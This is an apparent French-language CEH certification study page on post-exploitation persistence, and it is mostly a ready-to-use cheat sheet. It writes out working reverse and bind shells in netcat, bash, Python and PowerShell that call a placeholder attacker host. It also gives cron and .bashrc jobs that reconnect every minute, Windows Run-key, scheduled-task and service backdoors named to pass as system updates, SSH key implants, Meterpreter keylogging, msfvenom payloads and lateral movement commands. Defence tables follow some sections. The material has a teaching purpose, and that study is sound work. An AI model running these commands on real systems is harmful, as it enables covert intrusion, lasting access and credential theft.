# 🔒 05 — Maintien de l'Accès

> **CEH v13 | Module 6** | [← Retour au sommaire](./README.md)

---

## 📖 Définition

Le **maintien de l'accès** est l'ensemble des techniques permettant à un attaquant de conserver un accès persistant à un système compromis, même après un redémarrage, une déconnexion ou une réinitialisation du mot de passe.

```
Accès initial obtenu
        ↓
Installation de mécanismes de persistance
        ↓
Exécution d'applications malveillantes
        ↓
Monitoring des activités (keyloggers, spyware)
        ↓
Accès durable au système cible
```

---

## 🚪 Backdoors (Portes dérobées)

### Netcat — Le "couteau suisse" des backdoors

```bash
# ═══════════════════════════════════
# REVERSE SHELL (le plus utilisé)
# L'attaquant écoute, la victime se connecte
# ═══════════════════════════════════

# Côté ATTAQUANT — écouter
nc -lvnp 4444

# Côté VICTIME — se connecter et envoyer un shell
# Linux
nc <ATTACKER_IP> 4444 -e /bin/bash

# Windows
nc.exe <ATTACKER_IP> 4444 -e cmd.exe

# ═══════════════════════════════════
# BIND SHELL
# La victime écoute, l'attaquant se connecte
# ═══════════════════════════════════

# Côté VICTIME — créer le listener
nc -lvnp 4444 -e /bin/bash

# Côté ATTAQUANT — se connecter
nc <VICTIM_IP> 4444
```

---

### Reverse Shell sans Netcat

```bash
# Bash (Linux)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('ATTACKER',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()"
```

---

## 🔁 Persistance Windows

### Registry Run Keys

```bash
# Persistance au démarrage pour tous les utilisateurs (nécessite admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# Persistance pour l'utilisateur courant seulement
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\user\AppData\Roaming\backdoor.exe" /f

# RunOnce — s'exécute une fois au prochain démarrage
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\backdoor.exe" /f
```

### Tâches planifiées (Scheduled Tasks)

```bash
# Créer une tâche qui s'exécute au démarrage
schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\backdoor.exe" /sc onstart /ru SYSTEM

# Tâche quotidienne
schtasks /create /tn "BackupTask" /tr "C:\backdoor.exe" /sc daily /st 09:00

# Vérifier les tâches existantes
schtasks /query /fo LIST /v
```

### Services Windows

```bash
# Créer un service persistant
sc create "WindowsHelperSvc" binPath= "C:\backdoor.exe" start= auto
sc start "WindowsHelperSvc"

# Modifier un service existant
sc config "AffectedService" binPath= "C:\backdoor.exe"
```

---

## 🐧 Persistance Linux

### Cron Jobs

```bash
# Reverse shell toutes les minutes
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") | crontab -

# Cron système (requiert root)
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" >> /etc/crontab
```

### SSH Authorized Keys

```bash
# Générer une clé SSH
ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key

# Ajouter la clé publique à l'utilisateur cible
echo "ssh-rsa AAAA...backdoor_key.pub" >> /home/user/.ssh/authorized_keys

# Se connecter sans mot de passe
ssh -i /tmp/backdoor_key user@VICTIM_IP
```

### .bashrc / .profile

```bash
# Ajouter un reverse shell au profil bash
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /home/user/.bashrc
```

---

## ⌨️ Keyloggers

### Définition et types

```
KEYLOGGER = Outil qui capture et enregistre les frappes clavier

Types :
├─ SOFTWARE KEYLOGGERS
│   ├─ Niveau API (Windows API Hooks)
│   ├─ Niveau kernel (pilote filtrant)
│   ├─ Niveau navigateur (BHO, extension)
│   └─ Niveau formulaire (form grabbing)
│
└─ HARDWARE KEYLOGGERS
    ├─ Dispositif USB entre clavier et PC
    ├─ Keylogger sans fil (PS/2 ou USB)
    └─ Acoustic keylogger (sons des touches)
```

---

### Keyloggers via Metasploit

```bash
# Démarrer le keylogger (nécessite un shell Meterpreter)
meterpreter > keyscan_start

# Capturer les frappes
meterpreter > keyscan_dump

# Arrêter le keylogger
meterpreter > keyscan_stop
```

**Sortie exemple :**
```
Dumping captured keystrokes...
<Shift>Hello <Shift>World<Return>
password123<Return>
administrator<Tab>P@ssw0rd!<Return>
```

---

### Keyloggers distants (Remote Keylogger Attack)

```bash
# Metasploit — keylogger persistant via service
meterpreter > run post/windows/capture/keylog_recorder

# Installation via payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > keylogger_payload.exe
```

---

### Outils Keyloggers

| Outil | Plateforme | Type |
|-------|-----------|------|
| **REFOG Personal Monitor** | Windows | Software — monitoring familial/entreprise |
| **Spyrix Free Keylogger** | Windows | Software — capture + envoi par email |
| **Ardamax Keylogger** | Windows | Software — stealth |
| **Hardware Keylogger USB** | Hardware | Physique — indétectable logiciellement |

---

### Défense contre les Keyloggers

| Mesure | Description |
|--------|-------------|
| **Antivirus / EDR** | Détection des keyloggers connus |
| **Virtual Keyboard** | Saisie via clavier virtuel à l'écran |
| **Anti-keylogger** | Logiciels spécialisés (Zemana, SpyShelter) |
| **Mise à jour OS** | Patcher les vulnérabilités d'injection |
| **2FA / MFA** | Rend les mots de passe capturés inutiles |
| **Inspection physique** | Vérifier les connecteurs USB/PS2 |
| **Surveillance comportementale** | EDR détectant les hooks d'API suspects |

---

## 🕵️ Spyware

### Définition

Le **spyware** surveille les activités de l'utilisateur à son insu et envoie les informations collectées à un attaquant.

**Collecte typique :**
```
Spyware
├── Historique de navigation
├── Captures d'écran périodiques
├── Fichiers récents ouverts
├── Emails envoyés/reçus
├── Conversations (chat, SMS)
├── Données bancaires
├── Localisation GPS (mobile)
└── Photos/vidéos (accès caméra)
```

---

### Spyware notable (CEH)

| Outil | Description |
|-------|-------------|
| **REFOG** | Monitor activité clavier, écran, emails |
| **FlexiSPY** | Mobile spyware (iOS/Android) |
| **mSpy** | Surveillance mobile complète |
| **Spyrix** | Screenshots, keylogging, monitoring web |

---

## 🤖 PowerShell Empire

Framework de post-exploitation basé sur PowerShell et Python.

```
Composants :
├─ Listeners (HTTP, HTTPS, DNS...)
├─ Stagers (code minimal pour charger l'agent)
├─ Agents (Empire's Meterpreter-like)
└─ Modules (800+ modules de post-exploitation)

Avantage : entièrement en mémoire (fileless) → difficile à détecter
```

---

## 🔄 Pivoting et Lateral Movement

```bash
# Meterpreter — ajouter une route pour atteindre un réseau interne
meterpreter > route add 10.0.0.0/24 <session_id>

# Port forwarding — accéder à RDP interne via l'hôte compromis
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.5

# Depuis Kali
rdesktop 127.0.0.1:3389

# CrackMapExec — se déplacer latéralement
crackmapexec smb 10.0.0.0/24 -u admin -p Password123 --exec-method smbexec -x "whoami"
```

---

## 🛡️ Défense contre le maintien d'accès

| Mesure | Description |
|--------|-------------|
| **EDR (Endpoint Detection & Response)** | Détecte les comportements suspects en temps réel |
| **Surveiller les Run Keys** | Auditer `HKLM/HKCU\...\Run` régulièrement |
| **Surveiller les services** | Nouveaux services inattendus |
| **Analyse tâches planifiées** | Revue périodique des schtasks |
| **Network monitoring** | Connexions sortantes inhabituelles |
| **Application whitelisting** | N'autoriser que les exécutables connus |
| **SSH Key auditing** | Revoir les authorized_keys |
| **SIEM** | Corréler les événements suspects |
| **Honeypots** | Détecter les mouvements latéraux |

---

[← Privilege Escalation](./04-privilege-escalation.md) | [→ Rootkits & Fichiers cachés](./06-rootkits-hidden-files.md)